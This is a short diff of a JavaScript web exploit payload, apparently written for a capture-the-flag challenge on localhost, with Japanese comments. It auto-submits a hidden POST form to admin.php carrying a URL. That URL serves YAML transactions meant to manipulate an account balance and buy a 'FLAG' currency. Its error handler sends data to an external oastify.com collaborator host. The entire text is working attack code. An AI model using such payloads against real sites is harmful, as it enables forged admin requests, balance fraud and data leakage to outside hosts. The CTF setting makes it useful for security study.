@@ -1,20 +1,28 @@
 <script>
-  (async () => {
+    (async () => {
     try {
-      // 実在する国名を使用してバランス操作
-      const transactions = [
-        {amount: 1, country: 'Japan', op: 'BUY'},      // 1円で日本円を購入（コスト1、残高0）
-        {amount: 1000000, country: 'Japan', op: 'SELL'}, // 大量売却で残高を1000000に増加
-        {amount: 1, country: 'FLAG', op: 'BUY'}        // FL通貨を購入
-      ];
+      // YAMLデータを作成
+      const yaml = `- {amount: 1, currency: JP, op: BUY}
+  - {amount: 1000000, currency: JP, op: SELL}
+  - {amount: 1, currency: FL, op: BUY}`;
 
-      let params = '';
-      transactions.forEach((tx, i) => {
-        params += `transactions[${i}][amount]=${tx.amount}&`;
-        params += `transactions[${i}][country]=${tx.country}&`;
-      });
+      // YAMLを返すエンドポイントURL
+      const yamlUrl = "http://localhost:5000/index.php?html=" + encodeURIComponent(yaml);
 
-      window.location.href = `http://localhost:5000/admin.php?${params.slice(0, -1)}`;
+      // POSTリクエストを送信するフォームを動的に作成
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'http://localhost:5000/admin.php';
+      form.target = '_self';
+
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = 'url';
+      input.value = yamlUrl;
+
+      form.appendChild(input);
+      document.body.appendChild(form);
+      form.submit();
 
     } catch (e) {
       new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?error=" + encodeURIComponent(String(e));
